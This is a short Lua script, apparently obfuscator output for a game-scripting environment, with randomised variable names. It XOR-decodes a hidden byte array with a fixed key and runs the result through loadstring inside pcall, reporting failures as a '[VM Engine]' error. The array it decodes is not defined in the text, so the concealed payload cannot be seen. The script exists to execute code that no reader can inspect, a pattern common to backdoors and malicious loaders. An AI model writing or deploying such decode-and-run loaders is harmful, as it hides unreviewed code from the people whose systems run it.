local MEZXZoQY = 65
local ealCSsJV = ""

for eWUIoEEA = 1, #JBPZrpZi do
    local EVOnvEcO = JBPZrpZi[eWUIoEEA]
    if EVOnvEcO > 126 then EVOnvEcO = EVOnvEcO - 150 end
    local RwJBKpED = 0
    local a = EVOnvEcO
    local b = MEZXZoQY
    for _ = 1, 8 do
        local abit = a % 2
        local bbit = b % 2
        if abit ~= bbit then RwJBKpED = RwJBKpED + 2^(_-1) end
        a = math.floor(a / 2)
        b = math.floor(b / 2)
    end
    ealCSsJV = ealCSsJV .. string.char(RwJBKpED)
end

local _f = loadstring or load
local _success, _err = pcall(function()
    _f(ealCSsJV)()
end)

if not _success then
    warn("[VM Engine] Error: " .. tostring(_err))
end
